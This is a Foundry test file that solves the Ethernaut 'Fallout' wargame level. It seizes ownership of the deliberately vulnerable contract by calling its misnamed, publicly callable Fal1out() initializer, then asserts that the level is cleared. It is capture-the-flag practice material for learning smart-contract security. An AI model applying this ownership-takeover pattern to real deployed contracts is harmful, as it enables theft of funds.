// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "ds-test/test.sol";
import "../src/Ethernaut.sol";
import "../src/levels/Fallout/Fallout.sol";
import "../src/levels/Fallout/FalloutFactory.sol";
import {Vm} from "forge-std/Vm.sol";

contract FalloutTest is DSTest {
    Fallout public falloutInstance;
    Vm private constant vm = Vm(HEVM_ADDRESS);
    Ethernaut ethernaut;
    FalloutFactory falloutFactory;
    address eoaAddress = address(69);

    function setUp() public {
        // Initializing Fallout contract.
        ethernaut = new Ethernaut();
        falloutFactory = new FalloutFactory();
        ethernaut.registerLevel(falloutFactory);
        vm.label(0xb4c79daB8f259C7Aee6E5b2Aa729821864227e84, "Fallout Owner");
        vm.deal(eoaAddress, 1 ether);
    }

    function testIsFalloutCleared() public {
        vm.startPrank(eoaAddress);
        address levelAddress = ethernaut.createLevelInstance(falloutFactory);
        falloutInstance = Fallout(payable(levelAddress));
        falloutInstance.Fal1out();

        assertTrue(ethernaut.submitLevelInstance(payable(levelAddress)));

        vm.stopPrank();
    }
}
